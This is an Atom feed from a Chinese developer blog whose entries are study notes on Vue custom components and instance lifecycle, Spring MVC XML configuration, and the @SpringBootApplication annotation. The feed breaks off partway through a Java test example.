<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>龙场悟道中🥝</title>
  
  
  <link href="https://www.fomal.cc/atom.xml" rel="self"/>
  
  <link href="https://www.fomal.cc/"/>
  <updated>2023-06-17T10:43:55.849Z</updated>
  <id>https://www.fomal.cc/</id>
  
  <author>
    <name>龙场悟道中🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vue自定义组件</title>
    <link href="https://www.fomal.cc/posts/ec24c4ee.html"/>
    <id>https://www.fomal.cc/posts/ec24c4ee.html</id>
    <published>2023-08-13T12:26:46.170Z</published>
    <updated>2023-06-17T10:43:55.849Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>组件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 1.自定义标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mentaltest</span>&gt;</span><span class="tag">&lt;/<span class="name">mentaltest</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 2.自定义标签绑定固定值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jumparading</span> <span class="attr">num</span>=<span class="string">&quot;二&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">jumparading</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 3.自定义标签绑定变量 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hunter</span> <span class="attr">v-bind:three</span>=<span class="string">&quot;number&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">hunter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1.自定义标签</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;mentaltest&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">template</span>: <span class="string">&#x27;&lt;h1&gt; 这是第一个组件 &lt;h1&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2.自定义标签绑定固定值</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;jumparading&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">props</span>: [<span class="string">&#x27;num&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript"><span class="attr">template</span>: <span class="string">&#x27;&lt;h2&gt; 这是第&#123;&#123;num&#125;&#125;个组件 &lt;h2&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 3.自定义标签绑定变量</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;hunter&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">props</span>: [<span class="string">&#x27;three&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript"><span class="attr">template</span>: <span class="string">&#x27;&lt;h2&gt; 这是第&#123;&#123;three&#125;&#125;个组件 &lt;h2&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">number</span>:<span class="string">&#x27;三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">vue自定义组件</summary>
    
    
    
    <category term="vue" scheme="https://www.fomal.cc/categories/vue/"/>
    
    
    <category term="vue笔记" scheme="https://www.fomal.cc/tags/vue%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>vue实例</title>
    <link href="https://www.fomal.cc/posts/2248cef4.html"/>
    <id>https://www.fomal.cc/posts/2248cef4.html</id>
    <published>2023-08-13T12:26:46.167Z</published>
    <updated>2023-06-17T10:43:55.849Z</updated>
    
    <content type="html"><![CDATA[<p>vue实例就是你new出来的vue对象</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;a&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> data = &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 如果在此处使用Object.freeze()方法，则改变data中的值，不会影响到视图。如下</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Object.freeze(data);</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 此方法将data变为只读</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: data</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 此处展示data中的a,且此时,data中的a和app中的a是同一个</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">a</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">a</span> == app.<span class="property">a</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 如果修改app中的a,data中的a也会改变，为双向绑定</span></span></span><br><span class="line"><span class="language-javascript">app.<span class="property">a</span> = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">a</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 但是，我在此处，于data实例中加入b元素,app中不会加入b</span></span></span><br><span class="line"><span class="language-javascript">data.<span class="property">b</span> = <span class="number">100</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(app.<span class="property">b</span>)   <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">b</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 假如我想一开始就加入一个b元素，但是我不知道b的值，可以定义b为null，例如：var data = &#123;a:1, b:null&#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取到el这个元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(app.<span class="property">$el</span>==<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取data</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(app.<span class="property">$data</span> == data);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Vue实例生命周期："><a href="#Vue实例生命周期：" class="headerlink" title="Vue实例生命周期："></a>Vue实例生命周期：</h3><h4 id="生命周期过程："><a href="#生命周期过程：" class="headerlink" title="生命周期过程："></a>生命周期过程：</h4><ol><li>new Vue()实例化一个vue实例，然后init初始化event和lifecycle</li><li>执行beforeCeate生命周期函数</li><li>beforeCreate执行完后，进行数据初始化，定义data数据，方法以及事件</li><li>执行created生命周期函数。执行该函数的时候，可以拿到data下的数据以及methods下的方法，即，可调用方法进行数据请求</li><li>created执行完后，会判断当前是否有el参数。如果有，会再判断是否有template参数；如果没有，则等待调用$mount(el)方法</li><li>确保有了el之后，如果再往下判断是否有template参数。如果有，将template模板转化成render函数；如果没有，则将获取到的el编译成template,然后将这个template转换为render函数</li><li>再调用beforeMount</li><li>之后产生一个虚拟dom，进行保存，再将rander渲染成真实的dom</li><li>调用mounted</li><li>然后只有当数据变化时，触发beforeUpdate，将变化后的数据渲染到页面上，并且deforeUpate调用后，会重新生成一个新的虚拟dom，然后和原来的比较，算出最小更新范围，从而更新render之中的数据，再将render渲染成真实dom</li><li>beforeUpdate之后会执行update，具体过程和上一步差不多</li><li>之后就是beforeDestroy，此时仍可进行实例操作</li><li>销毁完成后，再执行destroyed</li></ol><h4 id="生命周期函数以及应用场景："><a href="#生命周期函数以及应用场景：" class="headerlink" title="生命周期函数以及应用场景："></a>生命周期函数以及应用场景：</h4><ul><li>beforeCreate（<strong>创建前</strong>）：常用于加loading</li><li>created（<strong>创建后</strong>）：loading结束后，做一些初始化，实现函数自执行</li><li>beforeMount（<strong>载入前</strong>）</li><li>mounted（<strong>载入后</strong>）：发起后端请求，拿回数据，配合路由钩子做一些事情</li><li>beforeUpdate（<strong>更新前</strong>）</li><li>updated（<strong>更新后</strong>）</li><li>beforeDestroy（<strong>销毁前</strong>）： 你确认删除XX吗？</li><li>destroyed（<strong>销毁后</strong>）：当前组件已被删除，清空相关内容</li></ul>]]></content>
    
    
    <summary type="html">vue实例</summary>
    
    
    
    <category term="vue" scheme="https://www.fomal.cc/categories/vue/"/>
    
    
    <category term="vue笔记" scheme="https://www.fomal.cc/tags/vue%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ssm构建笔记</title>
    <link href="https://www.fomal.cc/posts/739cd8bb.html"/>
    <id>https://www.fomal.cc/posts/739cd8bb.html</id>
    <published>2023-08-13T12:26:46.163Z</published>
    <updated>2023-06-17T10:43:55.839Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssm笔记"><a href="#ssm笔记" class="headerlink" title="ssm笔记"></a>ssm笔记</h1><h3 id="原始版构建方式"><a href="#原始版构建方式" class="headerlink" title="原始版构建方式"></a>原始版构建方式</h3><ol><li><p>alt+insert添加依赖，引入spring-webmvc依赖</p></li><li><p>open moudle setting 配置web中的web Resource Directories路径和Deployment Descriptos路径</p></li><li><p>创建任意controller</p></li><li><p>于resources文件夹中创建applicationContext.xml和spring-servlet.xml</p></li><li><p>applicationContext.xml配置，先配置需要扫描的包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- base-package 表示要扫描的包；use-default-filters表示使用默认的过滤器，true表示全扫--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;org.ll&quot;</span> <span class="attr">use-default-filters</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--除去controller，其他的都扫--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">experssion</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--下面可配mybatis--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>spring-servlet.xml的配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--不使用默认的过滤器，需要指定扫描的包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;org.ll&quot;</span> <span class="attr">user-default-filters</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--包括哪个，即指定哪个包--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--视图解析器等在下面配--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>web.xml文件配置</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--加载spring的配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--spring mvc的配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ssm构建笔记</summary>
    
    
    
    <category term="java笔记" scheme="https://www.fomal.cc/categories/java%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="java" scheme="https://www.fomal.cc/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>SpringBootApplication 注解</title>
    <link href="https://www.fomal.cc/posts/37d6ff2e.html"/>
    <id>https://www.fomal.cc/posts/37d6ff2e.html</id>
    <published>2023-08-13T12:26:46.158Z</published>
    <updated>2023-06-17T10:43:55.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SpringBootApplication-注解"><a href="#SpringBootApplication-注解" class="headerlink" title="@SpringBootApplication 注解"></a>@SpringBootApplication 注解</h2><p>@SpringBootApplication是一个组合注解，主要由@SpringBootConfiguration、@EnableAutoConfiguration和@ComponentScan组成</p><h3 id="SpringBootConfiguration详解"><a href="#SpringBootConfiguration详解" class="headerlink" title="@SpringBootConfiguration详解"></a>@SpringBootConfiguration详解</h3><p>@SpringBootConfiguration实际上就是@Configuration，功能上没有太大区别</p><h4 id="Configuration-注解"><a href="#Configuration-注解" class="headerlink" title="@Configuration 注解"></a>@Configuration 注解</h4><p>表示该类为配置类，在里面注入Bean</p><h5 id="Configuration和-Component-的区别"><a href="#Configuration和-Component-的区别" class="headerlink" title="@Configuration和@Component 的区别"></a>@Configuration和@Component 的区别</h5><ol><li>spring容器在启动时会默认加载一些后置处理器，其中有个处理器就叫ConfigurationClassPostProcessor，这个处理器会专门处理带有@Configuration注解的类。它会将所有带有@Conguration的类存进指定容器，然后通过cglib代理进行增强，对于已经被创建的对象不会进行重新创建。而@Component则没有被代理，会重复创建对象。</li></ol><h3 id="EnableAutoConfiguration注解"><a href="#EnableAutoConfiguration注解" class="headerlink" title="@EnableAutoConfiguration注解"></a>@EnableAutoConfiguration注解</h3><p>开启自动化配置，主要依靠@Import和@AutoConfigurationPackage,实际上就是导入了两个配置类AutoConfigurationImportSelector和Registrar</p><h4 id="首先我们解析-import的作用："><a href="#首先我们解析-import的作用：" class="headerlink" title="首先我们解析@import的作用："></a>首先我们解析@import的作用：</h4><p>在原生的spring framework中，组件装配经历了三个阶段：</p><ol><li><p>spring 2.5+开始，可以使用@component等注解来装配bean</p></li><li><p>spring 3.0+开始，使用@Configuration + @bean的方式</p></li><li><p>spring 3.1+ 开始，使用模块装配，比如@EnableXXX + @Import，下为演示</p><ol><li><p>首先创建一个实体类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Apple</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后自定义一个注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Import(&#123;Apple.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableFruit &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在启动类中加入注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFruit</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在测试类中进行测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DemoApplicationTests</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    Apple apple;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span 